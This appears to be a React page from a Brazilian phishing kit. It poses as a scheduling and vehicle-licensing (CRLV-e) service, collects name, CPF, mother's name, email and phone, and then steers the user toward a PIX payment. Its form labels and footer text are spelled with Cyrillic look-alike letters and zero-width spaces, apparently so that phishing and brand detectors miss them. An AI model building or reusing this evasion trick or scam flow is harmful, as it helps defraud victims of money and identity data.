import React, { useState, useEffect } from 'react';
import { User, Home, Calendar, MessageCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useNavigate } from 'react-router-dom';
import { useToast } from '@/hooks/use-toast';
import { usePushNotifications } from '@/hooks/usePushNotifications';
import { useAutoPushNotifications } from '@/hooks/useAutoPushNotifications';

const DadosPessoais = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const { sendNotification } = usePushNotifications();
  const { sendDataReceivedMessage } = useAutoPushNotifications();
  
  const [nomeCompleto, setNomeCompleto] = useState('');
  const [cpf, setCpf] = useState('');
  const [nomeMae, setNomeMae] = useState('');
  const [email, setEmail] = useState('');
  const [telefone, setTelefone] = useState('');
  const [servicoSelecionado, setServicoSelecionado] = useState<any>(null);

  useEffect(() => {
    // Recuperar serviço selecionado do localStorage
    const servico = localStorage.getItem('servicoSelecionado');
    if (servico) {
      setServicoSelecionado(JSON.parse(servico));
    }
  }, []);

  // Função para formatar CPF
  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 11) {
      return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }
    return value;
  };

  // Função para formatar telefone
  const formatTelefone = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 11) {
      if (numbers.length <= 10) {
        return numbers.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
      } else {
        return numbers.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
      }
    }
    return value;
  };

  // Função para validar email
  const isValidEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  // Função para validar CPF
  const isValidCPF = (cpf: string) => {
    const numbers = cpf.replace(/\D/g, '');
    return numbers.length === 11;
  };

  // Função para validar telefone
  const isValidTelefone = (telefone: string) => {
    const numbers = telefone.replace(/\D/g, '');
    return numbers.length >= 10 && numbers.length <= 11;
  };

  const isFormValid = () => {
    return nomeCompleto.trim() !== '' && 
           isValidCPF(cpf) && 
           nomeMae.trim() !== '' && 
           isValidEmail(email) && 
           isValidTelefone(telefone);
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value);
    setCpf(formatted);
  };

  const handleTelefoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatTelefone(e.target.value);
    setTelefone(formatted);
  };

  const handleProximo = () => {
    if (!isFormValid()) {
      let errorMessage = "Por favor, preencha todos os campos corretamente:";
      
      if (nomeCompleto.trim() === '') errorMessage += "\n• Nome completo é obrigatório";
      if (!isValidCPF(cpf)) errorMessage += "\n• CPF deve ter 11 dígitos";
      if (nomeMae.trim() === '') errorMessage += "\n• Nome da mãe é obrigatório";
      if (!isValidEmail(email)) errorMessage += "\n• Email deve ser válido";
      if (!isValidTelefone(telefone)) errorMessage += "\n• Telefone deve ter 10 ou 11 dígitos";

      toast({
        title: "Campos obrigatórios",
        description: errorMessage,
        variant: "destructive",
      });
      return;
    }
    
    // Salvar dados pessoais no localStorage
    const dadosPessoais = { nomeCompleto, cpf, nomeMae, email, telefone };
    localStorage.setItem('dadosPessoais', JSON.stringify(dadosPessoais));
    console.log('Dados pessoais:', dadosPessoais);
    
    // 🔔 3. Notificação automática de dados recebidos
    sendDataReceivedMessage();
    
    // Notificação local também
    sendNotification(
      '🔔 Após preencher os dados pessoais',
      '✅ Dados recebidos! Agora vamos gerar sua guia de pagamento via PIX. Isso garante o seu ​а​g​е​n​d​а​m​е​n​t​о de forma rápida e segura.',
      'data-received'
    );
    
    navigate('/endereco');
  };

  const handleLogoClick = () => {
    navigate('/');
  };

  const handleVoltar = () => {
    navigate('/');
  };

  const getImportantMessage = () => {
    if (servicoSelecionado?.nome === 'Licenciamento (CRLV-e)') {
      return 'Importante: Preencha os dados para pagamento do Licenciamento.';
    }
    return 'Importante: Preencha os dados em etapas para agendar seu atendimento.';
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 px-4 py-3">
        <div className="flex items-center justify-between max-w-md mx-auto">
          <img 
            src="/lovable-uploads/77c50366-3c6d-4d7b-b8a7-4fa2fc4e1fa3.png" 
            alt="imagem" 
            className="h-8 cursor-pointer hover:opacity-80 transition-opacity"
            onClick={handleLogoClick}
          />
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center">
              <User className="w-4 h-4 text-white" />
            </div>
            <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center">
              <Home className="w-4 h-4 text-gray-600" />
            </div>
            <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center">
              <Calendar className="w-4 h-4 text-gray-600" />
            </div>
            <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center">
              <MessageCircle className="w-4 h-4 text-gray-600" />
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">
          {/* Form Header */}
          <div className="bg-blue-600 text-white px-4 py-3">
            <h1 className="text-lg font-medium">Dados Pessoais</h1>
          </div>

          {/* Form Content */}
          <div className="p-4 space-y-4">
            {/* Important Notice */}
            <div className="bg-yellow-50 p-4 rounded-lg border border-yellow-200 mb-6">
              <p className="text-sm text-gray-700">
                <span className="font-medium">{getImportantMessage()}</span>
              </p>
            </div>

            {/* Nome Completo */}
            <div>
              <Label htmlFor="nomeCompleto" className="text-sm text-gray-600 mb-1 block">
                ​Ν​о​m​е​ ​С​о​m​р​l​е​t​о
              </Label>
              <Input
                id="nomeCompleto"
                value={nomeCompleto}
                onChange={(e) => setNomeCompleto(e.target.value)}
                className="border-gray-300"
                placeholder="Digite seu nome completo"
              />
            </div>

            {/* CPF */}
            <div>
              <Label htmlFor="cpf" className="text-sm text-gray-600 mb-1 block">
                ​С​Р​F
              </Label>
              <Input
                id="cpf"
                value={cpf}
                onChange={handleCPFChange}
                className="border-gray-300"
                placeholder="000.000.000-00"
                maxLength={14}
              />
            </div>

            {/* Nome da Mãe */}
            <div>
              <Label htmlFor="nomeMae" className="text-sm text-gray-600 mb-1 block">
                ​Ν​о​m​е​ ​d​а​ ​М​ã​е
              </Label>
              <Input
                id="nomeMae"
                value={nomeMae}
                onChange={(e) => setNomeMae(e.target.value)}
                className="border-gray-300"
                placeholder="Digite o nome da sua mãe"
              />
            </div>

            {/* Email */}
            <div>
              <Label htmlFor="email" className="text-sm text-gray-600 mb-1 block">
                Email
              </Label>
              <Input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="border-gray-300"
                placeholder="exemplo@email.com"
              />
            </div>

            {/* Telefone */}
            <div>
              <Label htmlFor="telefone" className="text-sm text-gray-600 mb-1 block">
                Telefone
              </Label>
              <Input
                id="telefone"
                value={telefone}
                onChange={handleTelefoneChange}
                className="border-gray-300"
                placeholder="(11) 99999-9999"
                maxLength={15}
              />
            </div>

            {/* Buttons */}
            <div className="flex gap-3 pt-4">
              <Button 
                variant="outline" 
                className="flex-1 bg-gray-300 text-gray-700 border-gray-300 hover:bg-gray-400 h-10"
                onClick={handleVoltar}
              >
                Voltar
              </Button>
              <Button 
                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white h-10"
                onClick={handleProximo}
              >
                Próximo
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="bg-slate-800 text-white mt-auto">
        <div className="max-w-md mx-auto px-4 py-8 text-center">
          <img 
            src="/lovable-uploads/a01f8b20-e4c2-4d31-bfe8-4c0e6d88ddd4.png" 
            alt="imagem" 
            className="h-12 mx-auto mb-4"
          />
          <h2 className="text-lg font-medium mb-2">​Agiliza mais</h2>
          <p className="text-sm text-gray-300 mb-6">
            ​Ѕ​е​r​v​і​ç​о​ ​р​r​і​v​а​d​о​ ​d​е​ ​а​g​е​n​d​а​m​е​n​t​о
          </p>
          <div className="border-t border-gray-600 pt-4">
            <p className="text-xs text-gray-400">
              ​Т​о​d​о​ѕ​ ​о​ѕ​ ​d​і​r​е​і​t​о​ѕ​ ​r​е​ѕ​е​r​v​а​d​о​ѕ
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default DadosPessoais;
